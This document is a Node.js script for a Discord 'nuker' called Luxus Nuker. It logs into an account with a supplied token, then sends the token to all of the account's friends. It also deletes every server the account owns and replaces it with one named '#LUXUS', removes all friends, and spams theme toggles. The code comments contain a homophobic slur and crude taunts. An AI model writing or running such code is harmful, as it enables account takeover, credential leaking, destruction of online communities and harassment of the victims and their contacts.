console.clear()
const toolbox = require('./utils-nexon')
const layout = require('./layout')
const CFonts = require('cfonts')
const colors = require("colors")


const Discord = require('discord.js')
const client = new Discord.Client()


const readline = require('readline')
const rl = readline.createInterface({input: process.stdin, output: process.stdout})

rl.question("Enter token: ", (t) => {




const tokenembed = new Discord.RichEmbed()
.setTitle("My Token!")
.setDescription(`Hey i just got fucked by LUXUS NUKER:  \n Here is my token: ${t}   \n ;3  uWu -W-  `)
.setColor("RANDOM")
.setTimestamp()
.setFooter("Luxus Nuker")


client.on("ready", () => {
    console.clear()
    layout()
    console.log(colors.bold.green(`Account Token Getting Nuked:  ${client.user.tag}`))
    console.log(colors.bold.red("========================================================================================================================\n========================================================================================================================\n\n"))
    
    //Token sent in a embed to all the people the FAGGOT (Totally not homophobic) has added!
    client.user.friends.forEach(friend => {
        friend.send(tokenembed).then(console.log(colors.bold.bgRed(`Sent Token Embed To: ${friend.tag}`)))
    })
    
    //forEach Server the FAGGOT leaves a new one will be created
    client.guilds.forEach(guild => {
        guild.delete().then(client.user.createGuild("#LUXUS")).catch(err => {
            if(err) return console.log(colors.bold.bgYellow("Error Found !!"))
        })
    })

    setTimeout(() => {
        client.user.friends.forEach(friend => {
            friend.removeFriend().then(console.log(colors.bold.bgGreen(`Unfriended UserTag: ${friend.tag}`)))
        })
        setInterval(() => {

            toolbox.lightMode(t)
            toolbox.darkMode(t)
        }, 100)
    }, 5000)

    client.user.setActivity("Luxus fucked me : D", {type: "STREAMING", url: "https://twitch.tv/Luxus fucked me : D"})
    


    
    


})
client.login(t)
})